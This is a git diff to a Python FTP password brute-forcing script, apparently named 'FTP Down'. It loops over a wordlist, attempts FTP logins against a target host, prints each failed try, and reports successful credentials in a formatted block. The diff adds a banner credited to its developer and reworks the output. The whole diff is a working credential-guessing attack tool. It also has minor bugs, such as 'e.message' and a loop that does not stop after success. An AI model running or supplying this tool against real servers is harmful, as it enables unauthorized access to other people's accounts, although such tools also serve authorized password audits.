@@ -1,21 +1,33 @@
 from ftplib import FTP 
-import argparse
 from sys import exit
+import os
+import socket
+import argparse
+
+def banner():
+    print('''
+
+______ ___________  ______                    
+|  ___|_   _| ___ \ |  _  \                   
+| |_    | | | |_/ / | | | |_____      ___ __  
+|  _|   | | |  __/  | | | / _ \ \ /\ / / '_ \ 
+| |     | | | |     | |/ / (_) \ V  V /| | | |
+\_|     \_/ \_|     |___/ \___/ \_/\_/ |_| |_|
+                                              
+[+]Developer    - Gabriel Dutra(T9++)
+[+]Linkedin     - linkedin.com/in/gmdutra
+    ''')
 
 def check(host, username, passwd):
 
     try:
         ftp = FTP(host)
         ftp.login(username, passwd)
-        ftp.quit()
 
-        print("Host: {}".format(host))
-        print("Username: {}".format(username))
-        print("Password: {}".format(passwd))
-   
-        exit(0)
+        print_result(host, username, passwd)
+        return 1
     except:
-        pass
+        print(f"[+] user={username} - pass={passwd} - FALIED\r", end="")
 
 def loadWordlist(host, username, wordlist):
 
@@ -27,9 +39,21 @@ def loadWordlist(host, username, wordlist):
             line = line.strip()
             check(host, username, line)
 
-    except:
-        print("Ocorreu erros")
-        exit(0)
+    except Exception as e:
+        print(f"Error: {e.message}")
+        exit(1)
+
+def print_result(host, username, passwd):
+
+    print(f'''
+-------------------------------------------
+            Login successful
+-------------------------------------------
+[+]Host     = {host}                       
+[+]Username = {username}                   
+[+]Password = {passwd}                     
+-------------------------------------------
+        ''')
 
 def main():
 
@@ -49,4 +73,5 @@ def main():
     loadWordlist(host, user, wordlist)
     
 if __name__ == '__main__':
-        main()    
+    banner()
+    main()    
